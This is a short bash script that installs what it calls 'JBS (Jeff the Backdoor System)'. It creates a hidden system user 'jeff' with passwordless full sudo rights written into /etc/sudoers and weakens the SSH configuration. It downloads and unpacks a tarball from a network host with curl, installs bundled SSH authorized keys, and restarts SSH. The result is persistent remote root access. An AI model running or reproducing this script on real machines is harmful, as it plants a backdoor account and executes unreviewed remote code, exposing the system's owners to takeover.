#!/bin/bash --verbose

set -e -u -o pipefail

test "${#}" -eq 0


test ! -e /etc/jbs

echo '2db52366-3bbe-11de-8f5f-001b2400005e' >/etc/jbs


adduser --system \
		--home /home/jeff \
		--shell /home/jeff/.jbs/core/cmd_shell.bash \
		--group \
		--disabled-password \
		jeff


cat <<EOF >>/etc/sudoers

#begin{2db52366-3bbe-11de-8f5f-001b2400005e}
# JBS (Jeff the Backdoor System)
jeff ALL=(ALL) NOPASSWD: ALL
#end{2db52366-3bbe-11de-8f5f-001b2400005e}

EOF


cat <<EOF >>/etc/ssh/sshd_config

#begin{2db52366-3bbe-11de-8f5f-001b2400005e}
# JBS (Jeff the Backdoor System)
PermitUserEnvironment yes
#end{2db52366-3bbe-11de-8f5f-001b2400005e}

EOF


curl -\# 'http://10.0.0.130:9999/jbs.tar' \
| tar -xv -C /home/jeff


mkdir /home/jeff/.ssh


ln /home/jeff/.jbs/users/keys.ssh /home/jeff/.ssh/authorized_keys


chown -Rhv jeff:jeff /home/jeff
chmod u=rwX,g=,o= /home/jeff


/etc/init.d/ssh restart


exit 0
